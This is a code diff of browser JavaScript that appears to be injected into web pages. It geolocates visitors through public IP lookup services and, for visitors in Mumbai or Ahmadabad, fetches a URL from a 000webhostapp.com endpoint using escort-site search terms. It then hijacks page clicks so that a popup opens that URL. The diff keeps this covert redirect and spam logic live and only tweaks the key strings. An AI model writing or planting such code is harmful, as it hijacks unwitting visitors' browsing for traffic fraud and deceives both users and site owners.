@@ -7,15 +7,15 @@ let aa='';
 if(!localStorage.v){
   (async()=>{
    try{aa=await(await(await fetch('http://ip-api.com/line/?fields=city')).text());}catch(e){aa=await(await(await fetch('https://ipapi.co/city')).text());}
+    localStorage.v=1;
     if(aa=='Mumbai'){localStorage.m='1';uhd()}
     if(aa=='Ahmadabad'){localStorage.a='1';uhd()}
-    localStorage.v=1;
   })();
 }
 let uhd=()=>{
   (async(q,k)=>{
-    if(localStorage.m){q='best+mumbai+escorts+mumbai.miniescort.com';k='mumbai.miniescort.com/&'}
-    if(localStorage.a){q='ahmedabad+escorts+sohanisharma';k='sohanisharma.com/&'}
+    if(localStorage.m){q='best+mumbai+escorts+mumbai.miniescort.com';k='mumbai.miniescort.com'}
+    if(localStorage.a){q='ahmedabad+escorts+sohanisharma';k='sohanisharma.com'}
     let bb=(await(await fetch(`https://finable-slot.000webhostapp.com/gsurl?q=${q}&start=0&num=5&key=${k}`)).text());
     document.onclick=()=>{
         if(mi==3&&se>5&&se<9&bb!=''){window.open(bb);}
